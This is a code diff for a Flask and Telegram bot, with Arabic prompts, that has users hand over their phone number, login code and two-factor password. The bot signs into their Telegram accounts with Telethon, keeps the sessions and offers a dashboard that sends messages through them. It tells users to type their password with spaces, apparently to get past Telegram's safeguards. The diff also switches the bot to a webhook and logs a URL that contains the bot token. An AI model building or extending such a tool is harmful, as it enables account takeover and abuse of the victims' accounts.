@@ -1,7 +1,8 @@
 import os
 import secrets
+import asyncio
 from flask import Flask, request, jsonify, send_file
-from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
+from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, Bot
 from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes, ConversationHandler
 from telethon import TelegramClient
 from telethon.sessions import StringSession
@@ -19,6 +20,7 @@ BASE_URL = os.environ.get("BASE_URL", "")
 app = Flask(__name__)
 sessions = {}
 user_tokens = {}
+application = None
 
 PHONE, CODE, PASSWORD = range(3)
 
@@ -55,8 +57,7 @@ async def get_code(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text(
             "🔐 حسابك عنده مصادقة ثنائية!\n\n"
             "أرسل كلمة المرور بشكل مفرق\n"
-            "مثال: إذا كلمتك hello123 أرسلها:\n"
-            "h e l l o 1 2 3"
+            "مثال: h e l l o 1 2 3"
         )
         return PASSWORD
     except Exception as e:
@@ -70,10 +71,9 @@ async def get_password(update: Update, context: ContextTypes.DEFAULT_TYPE):
     try:
         await client.sign_in(password=password)
         return await finish_login(update, context, client)
-    except Exception as e:
+    except Exception:
         await update.message.reply_text(
-            "❌ كلمة المرور خاطئة\n"
-            "حاول مرة ثانية، تذكر تفرق الحروف بمسافات:"
+            "❌ كلمة المرور خاطئة\nحاول مرة ثانية:"
         )
         return PASSWORD
 
@@ -87,7 +87,7 @@ async def finish_login(update: Update, context: ContextTypes.DEFAULT_TYPE, clien
     dashboard_url = f"{BASE_URL}/dashboard?token={token}"
     keyboard = [[InlineKeyboardButton("🚀 افتح لوحة التحكم", url=dashboard_url)]]
     await update.message.reply_text(
-        "✅ تم تسجيل الدخول بنجاح!\n\nاضغط الزر لفتح لوحة التحكم:",
+        "✅ تم تسجيل الدخول!\nاضغط الزر لفتح لوحة التحكم:",
         reply_markup=InlineKeyboardMarkup(keyboard)
     )
     return ConversationHandler.END
@@ -109,6 +109,15 @@ def dashboard():
         return "غير مصرح", 403
     return send_file("index.html")
 
+@app.route(f"/webhook/{BOT_TOKEN}", methods=["POST"])
+def webhook():
+    data = request.get_json()
+    if application:
+        asyncio.run(
+            application.process_update(Update.de_json(data, application.bot))
+        )
+    return "ok"
+
 @app.route("/api/send", methods=["POST"])
 def send_messages():
     data = request.json
@@ -117,12 +126,10 @@ def send_messages():
         return jsonify({"error": "لا توجد جلسة"}), 401
     return jsonify({"status": "ok"})
 
-# ── MAIN ──
+# ── SETUP WEBHOOK ──
 
-def run_bot():
-    import asyncio
-    loop = asyncio.new_event_loop()
-    asyncio.set_event_loop(loop)
+async def setup():
+    global application
     application = Application.builder().token(BOT_TOKEN).build()
     conv = ConversationHandler(
         entry_points=[CommandHandler("start", start)],
@@ -134,11 +141,11 @@ def run_bot():
         fallbacks=[CommandHandler("cancel", cancel)],
     )
     application.add_handler(conv)
-    loop.run_until_complete(application.run_polling())
+    await application.initialize()
+    webhook_url = f"{BASE_URL}/webhook/{BOT_TOKEN}"
+    await application.bot.set_webhook(webhook_url)
+    logger.info(f"Webhook set: {webhook_url}")
 
 if __name__ == "__main__":
-    import threading
-    t = threading.Thread(target=run_bot)
-    t.daemon = True
-    t.start()
+    asyncio.run(setup())
     app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000)))
